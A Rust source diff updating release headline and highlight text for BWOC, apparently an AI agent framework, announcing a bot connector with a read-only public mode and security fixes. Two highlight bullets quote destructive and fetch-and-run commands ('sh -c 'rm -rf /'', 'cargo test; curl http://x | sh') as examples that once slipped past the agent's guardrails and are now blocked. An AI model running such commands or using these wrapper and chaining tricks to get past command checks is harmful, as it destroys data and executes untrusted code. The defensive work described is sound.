@@ -20,7 +20,7 @@ pub const HEADLINE: &str = concat!(
     env!("CARGO_PKG_VERSION_MAJOR"),
     ".",
     env!("CARGO_PKG_VERSION_MINOR"),
-    " — the compatibility contract: every artifact declares its schema, `bwoc migrate` moves an installation forward without losing what BWOC does not model, and `[plugin].compat` is finally enforced"
+    " — bwoc-bot phase 1: one agent, one bot — connector commands and rate limits, an opt-in limited public mode with read-only tools in an isolated workdir, and symlink-safe file confinement"
 );
 
 /// Short highlight bullets for the current MAJOR.MINOR. Keep ≤6, each a
@@ -31,12 +31,12 @@ pub const HEADLINE: &str = concat!(
 /// the auto-version hook bumps the minor without anyone refreshing this
 /// prose — i.e. "update What's New every release" is enforced, not trusted.
 pub const HIGHLIGHTS: &[&str] = &[
+    "**bwoc-bot — one agent, one bot.** A connector `[bot]` block answers slash commands without the model and caps each sender's rate and message length; `public = true` opts into a limited public mode — strangers reach the agent only by DM or @mention, in read-only `plan` mode, inside an isolated workdir with no memories or other chats (3.1.0, #506)",
     "**BWOC 3.0 — the compatibility contract.** Every artifact BWOC owns now declares which revision wrote it (`schema_version`), **`bwoc migrate`** moves a workspace or a whole fleet forward — splicing in place, so comments and keys BWOC does not model survive — and `[plugin].compat` is enforced with bounded ranges instead of merely declared. 3.x reads everything 2.x wrote and names the migration; schema 2 goes away in 4.0 (3.0.0, `docs/en/COMPATIBILITY.en.md`)",
     "**Loop-Engineering L3 — product loops.** `bwoc monitor --exec \"<probe>\" --loop` watches any command and alerts a fleet member **once per OK↔TRIP transition**, and `bwoc digest --exec \"<cmd>\" --period daily` delivers a digest **once per period** — a gate a bare cron can't give (a restart re-runs; a poll loop re-fires every tick). Both ride the new durable `IdempotencyLedger`, and both stay trust-preserving: the monitor sends only a scalar, the digest only to a local sink (2.44.0, #453–#456)",
     "**Provider resilience** — HTTP **429** (rate limit) and **408** are now retryable, not fatal: the most common real-world provider failure rides the existing backoff loop instead of aborting the run, and a server `Retry-After` hint is honoured (clamped so a hostile endpoint can't park the run). One function fronts every backend (2.45.0, #486)",
     "**Guardrails see through wrappers** — the destruction / privilege checks now peel transparent command wrappers before gating, so `env rm -rf /`, `timeout 5 rm -rf /`, `xargs rm -rf`, and `sh -c 'rm -rf /'` no longer slip past the first-token check. Fail-closed: a command it can't resolve is blocked, not certified (2.45.0, #487)",
     "**Allow-rules can't be tricked** — an `allow` pattern on a shell-bearing tool grants only when the *whole* command is covered, so `allow \"cargo test\"` no longer green-lights `cargo test; curl http://x | sh`; unparseable args fail closed (2.45.0, #492)",
-    "**3.0.1 fixes from a real fleet rollout** — chat connectors keep one conversation file per chat (a DM and a group no longer share history), `bwoc init` keeps an existing agent registry instead of wiping it, and `bwoc new` stamps specification 3.0 (3.0.1)",
 ];
 
 /// `MAJOR.MINOR` of the current build (the patch component churns on every
